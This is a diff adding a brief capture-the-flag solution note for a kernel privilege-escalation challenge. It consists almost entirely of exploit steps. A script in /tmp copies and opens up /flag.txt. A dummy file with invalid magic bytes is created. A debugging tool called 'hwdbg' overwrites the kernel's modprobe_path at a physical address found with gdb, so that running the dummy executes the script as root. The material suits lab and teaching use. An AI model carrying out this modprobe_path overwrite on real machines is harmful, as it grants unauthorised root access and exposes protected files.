@@ -1,0 +1,14 @@
+Create /tmp/newpath with following contents:
+#!/bin/sh
+cp /flag.txt /tmp/flag.txt
+chmod 777 /tmp/flag.txt
+
+then create a fake executable to trigger modprobe path:
+
+echo -ne '\xff\xff\xff\xff' > /tmp/dummy
+
+then execute hwdbg with phys offset of modprobe path (found w/ gdb):
+
+echo -ne '/tmp/newpath\0' | hwdbg mw 13 0x3433b60
+
+execute dummy file which will trigger /tmp/newpath
